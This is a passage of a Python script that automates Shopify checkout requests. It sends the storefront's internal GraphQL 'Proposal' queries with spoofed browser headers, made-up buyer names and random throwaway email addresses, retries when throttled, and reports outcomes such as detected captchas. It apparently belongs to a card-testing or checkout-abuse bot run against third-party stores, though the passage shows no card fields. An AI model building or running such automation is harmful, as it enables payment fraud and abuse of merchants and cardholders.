PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{id cvvSessionId paymentInstrumentAccessorId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name __typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
            'variables': {
                'sessionInput': {
                    'sessionToken': x_checkout_one_session_token,
                },
                'queueToken': queue_token,
                'discounts': {
                    'lines': [],
                    'acceptUnexpectedDiscounts': True,
                },
                'delivery': {
                    'deliveryLines': [
                        {
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': addr["address1"],
                                    'city': addr["city"],
                                    'countryCode': addr["countryCode"],
                                    'postalCode': addr["postalCode"],
                                    'firstName': 'Laka',
                                    'lastName': 'Lama',
                                    'zoneCode': addr["zoneCode"],
                                    'phone': addr["phone"],
                                    'oneTimeUse': False,
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {
                                        'any': True,
                                    },
                                    'shipments': {
                                        'any': True,
                                    },
                                },
                                'options': {},
                            },
                            'targetMerchandiseLines': {
                                'any': True,
                            },
                            'deliveryMethodTypes': [
                               'SHIPPING',
                            ],
                            'expectedTotalPrice': {
                                'any': True,
                            },
                            'destinationChanged': False,
                        },
                    ],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True,
                },
                'deliveryExpectations': {
                    'deliveryExpectationLines': [],
                },
                'merchandise': {
                    'merchandiseLines': [
                        {
                            'stableId': stable_id,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                    'variantId': f'gid://shopify/ProductVariant/{product_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None,
                                },
                            },
                            'quantity': {
                                'items': {
                                    'value': 1,
                                },
                            },
                            'expectedTotalPrice': {
                                'value': {
                                    'amount': f"{price}",
                                    'currencyCode': f'{addr["currencyCode"]}',
                                },
                            },
                            'lineComponentsSource': None,
                            'lineComponents': [],
                        },
                    ],
                },
                'memberships': {
                    'memberships': [],
                },
                'payment': {
                    'totalAmount': {
                        'any': True,
                    },
                    'paymentLines': [],
                    'billingAddress': {
                        'streetAddress': {
                            'address1': addr["address1"],
                            'city': addr["city"],
                            'countryCode': addr["countryCode"],
                            'postalCode': addr["postalCode"],
                            'firstName': 'Laka',
                            'lastName': 'Lama',
                            'zoneCode': addr["zoneCode"],
                            'phone': addr["phone"],
                        },
                    },
                },
                'buyerIdentity': {
                    'customer': {
                        'presentmentCurrency': f'{addr["currencyCode"]}',
                        'countryCode': f'{countryCode}',
                    },
                    'email': f"gmail{__import__('random').randint(100000,999999)}@gmail.com",
                    'emailChanged': False,
                    'phoneCountryCode': f'{countryCode}',
                    'marketingConsent': [],
                    'shopPayOptInPhone': {
                        'countryCode': f'{countryCode}',
                    },
                    'rememberMe': False,
                },
                'tip': {
                    'tipLines': [],
                },
                'taxes': {
                    'proposedAllocations': None,
                    'proposedTotalAmount': {
                        'value': {
                            'amount': f"{tax1}",
                            'currencyCode': f'{addr["currencyCode"]}',
                        },
                    },
                    'proposedTotalIncludedAmount': None,
                    'proposedMixedStateTotalAmount': None,
                    'proposedExemptions': [],
                },
                'note': {
                    'message': None,
                    'customAttributes': [],
                },
                'localizationExtension': {
                    'fields': [],
                },

                'nonNegotiableTerms': None,
                'scriptFingerprint': {
                    'signature': None,
                    'signatureUuid': None,
                    'lineItemScriptChanges': [],
                    'paymentScriptChanges': [],
                    'shippingScriptChanges': [],
                },
                'optionalDuties': {
                    'buyerRefusesDuties': False,
                },
                'captcha': None,
                'cartMetafields': [],
            },
            'operationName': 'Proposal',
        }

        proposal1 = None
        p1_sc = 0
        p1_text = ""
        for _p1_attempt in range(6):
            # Wrap request with security token (headers only, JSON unchanged for API compatibility)
            # Removed tokenization
            p1_req = await session.post(f'{url}/checkouts/internal/graphql/persisted', params=params, headers=headers, json=json_data, timeout=22)
            p1_sc = getattr(p1_req, "status_code", 0)
            p1_text = (p1_req.text or "").strip()
            if p1_sc == 200:
                proposal1 = p1_req
                break
            if p1_sc in (429, 502, 503, 504) and _p1_attempt < 5:
                backoff = 2.0 + _p1_attempt * 1.0 if p1_sc == 429 else 1.0 + _p1_attempt * 0.7
                await asyncio.sleep(backoff)
                continue
            break
        if proposal1 is None and p1_sc != 200:
            output.update({
                "Response": f"NEGOTIATE_HTTP_{p1_sc}",
                "Status": False,
            })
            _log_output_to_terminal(output)
            return output
        if p1_text.startswith("<"):
            if any(x in p1_text.lower() for x in ["captcha", "hcaptcha", "recaptcha"]):
                output.update({"Response": "HCAPTCHA_DETECTED", "Status": False})
                _log_output_to_terminal(output)
                return output
            output.update({"Response": "NEGOTIATE_HTML_ERROR", "Status": False})
            _log_output_to_terminal(output)
            return output

        match = re.search(r'"totalTaxAndDutyAmount"\s*:\s*{[^}]*"value"\s*:\s*{[^}]*"amount"\s*:\s*"([\d.]+)"', p1_text)
        if not match:
            match = re.search(r'"totalAmountIncludedInTarget"\s*:\s*{[^}]*"value"\s*:\s*{[^}]*"amount"\s*:\s*"([\d.]+)"', p1_text)
        try:
            tax2 = float(match.group(1)) if match else (float(tax1) if tax1 else 0.0)
        except (TypeError, ValueError):
            tax2 = 0.0

        if not DMT:
            matches = re.findall(r'"deliveryMethodTypes"\s*:\s*\[(.*?)\]', p1_text)
            DMT = matches[0] if matches else 'SHIPPING'
            DMT = DMT.replace('"', '') if DMT else 'SHIPPING'
            # print(DMT)

        # print(f"Delivery Methods : {DMT}")

        # print(f"Total Tax: {tax2}")


        headers = {
            'authority': domain,
            'accept': 'application/json',
            'accept-language': 'en-IN',
            'content-type': 'application/json',
            'origin': url,
            'referer': url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': f'{mobile}',
            'sec-ch-ua-platform': f'"{clienthint}"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'user-agent': f'{getua}',
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': token,
        }

        params = {
            'operationName': 'Proposal'
        }

        json_data = {
            'query': 'query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions,cartMetafields:$cartMetafields,memberships:$memberships},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename reportable}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId 